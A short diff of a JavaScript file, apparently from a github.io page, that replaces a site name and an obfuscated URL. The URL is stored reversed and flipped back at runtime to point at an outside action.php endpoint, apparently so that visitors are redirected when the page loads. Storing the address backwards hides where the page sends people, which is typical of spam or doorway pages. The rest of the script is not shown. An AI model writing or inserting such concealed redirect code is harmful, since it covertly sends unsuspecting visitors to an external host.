@@ -1,6 +1,6 @@
 var get_vars = '';
-var go_url = 'oi.buhtig.333yubekac=od?php.noitca/e/ten.ndc-dw//:sptth';
-var page_url = 'cakebuy333.github.io';
+var go_url = 'oi.buhtig.122reppohsffuts=ps?php.noitca/e/ten.ndc-dw//:sptth';
+var page_url = 'stuffshopper221.github.io';
 var new_url = go_url.split("").reverse().join("");
 
 $(document).ready(function() {
